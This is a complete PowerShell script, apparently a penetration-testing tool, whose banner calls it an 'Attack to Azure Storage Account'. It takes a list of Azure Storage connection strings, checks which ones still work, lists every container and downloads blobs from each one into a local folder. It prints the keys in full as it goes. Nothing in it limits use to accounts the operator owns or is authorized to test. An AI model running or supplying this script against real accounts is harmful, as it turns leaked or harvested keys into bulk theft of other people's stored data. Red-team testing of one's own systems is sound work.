<#
.SYNOPSIS
    Access and download blobs from Azure Storage Accounts using provided connection strings.

.DESCRIPTION
    This script reads a file containing connection strings (either SAS Keys or Access Keys) for Azure Storage Accounts.
    For each valid connection string, it identifies the available blobs and downloads a specified number of blobs from each container.

.PARAMETER connectionStringsFile
    The path to the file containing connection strings, one per line.

.PARAMETER blobsToDownloadCount
    The number of blobs to download from each identified container.

.EXAMPLE
    .\Access-AzureStorageAccount.ps1 -connectionStringsFile "connectionStrings.txt" -blobsToDownloadCount 5
    This command will read the connection strings from "connectionStrings.txt" and download 5 blobs from each container in the identified storage accounts.

.NOTES
    Author: Daniel Hejda
    Company: Cyber Rangers s.r.o. 
    Date Created: 2024-07-11
    Change Log:
        2024-07-11 - Script created.
#>

param (
    [string]$connectionStringsFile,
    [string]$blobsToDownloadCount
)

# Hlavicka
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkYellow
Write-Host "Attack to Azure Storage Account" -ForegroundColor Cyan
Write-Host "--> Connection strings file: $($connectionStringsFile)" -ForegroundColor Blue
Write-Host "--> How many files from each blob will be downloaded: $($blobsToDownloadCount)" -ForegroundColor Blue
Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkYellow


# Kontrola existence souboru
if (-Not (Test-Path $connectionStringsFile)) {
    Write-Host "File $($connectionStringsFile) not exist." -ForegroundColor Red
    exit
}

# Načtení connection stringů
Write-Host "Loading file $($connectionStringsFile)" -ForegroundColor Green
$connectionStrings = @(Get-Content -Path $connectionStringsFile)

# Import Azure module, pokud ještě není importován
Write-Host "Check availability for Az module" -fore Green
if (-Not (Get-Module -ListAvailable -Name Az.Storage)) {
    Write-Host "Install Az Module" -ForegroundColor Green
    Install-Module -Name Az -Force -AllowClobber  > $null
}
Write-Host "Import module Az" -ForegroundColor Green
Import-Module Az

# Funkce pro ověření connection stringu
function Test-StorageAccountConnection {
    param (
        [string]$connectionString
    )

    try {
        # Nastavení kontextu pro Azure Storage
        Write-Host "--> Set Azure Context" -ForegroundColor Cyan
        Write-Host "----> $($connectionString)" -ForegroundColor Cyan
        $context = New-AzStorageContext -ConnectionString $connectionString

        # Ověření, zda se můžeme připojit
        Write-Host "------> Connect to Azure storage account" -ForegroundColor Blue
        $containers = Get-AzStorageContainer -Context $context -ErrorAction Stop
        Write-Host "--------> Success connection" -ForegroundColor Green

        # Výpis existujících kontejnerů a stažení souborů
        foreach ($container in $containers) {
            if ($container.PublicAccess -eq "Blob") {
                Write-Host "----------> $($container.Name) with PublicAccess is ($($container.PublicAccess))" -ForegroundColor Green
            } else {
                Write-Host "----------> $($container.Name) with PublicAccess is ($($container.PublicAccess))" -ForegroundColor Yellow
            }

            # Získání blobů v kontejneru
            $blobs = Get-AzStorageBlob -Container $container.Name -Context $context -ErrorAction Stop

            # Stažení nastaveného počtu blobů
            $blobsToDownload = $blobs | Select-Object -First $blobsToDownloadCount
            foreach ($blob in $blobsToDownload) {
                $blobName = $blob.Name
                $destinationPath = Join-Path -Path "DownloadedBlobs" -ChildPath $blobName

                # Vytvoření adresáře pro stažené soubory, pokud neexistuje
                $destinationDirectory = Split-Path -Path $destinationPath
                if (-Not (Test-Path $destinationDirectory)) {
                    New-Item -ItemType Directory -Path $destinationDirectory -Force > $null
                }                

                Write-Host "------------> Downloading $blobName from container $($container.Name)" -ForegroundColor Cyan
                $DownloadedBlob = Get-AzStorageBlobContent -Blob $blobName -Container $container.Name -Context $context -Destination $destinationPath -Force
                Write-Host "--------------> Downloading this blob $($DownloadedBlob.Name)" -ForegroundColor Green
            }
        }

    }
    catch {
        Write-Host "--------> Failed connection" -ForegroundColor red
    }
    Write-Host ""
}

# Procházení každého connection stringu a jeho testování
foreach ($connectionString in $connectionStrings) {
    Test-StorageAccountConnection -connectionString $connectionString
}
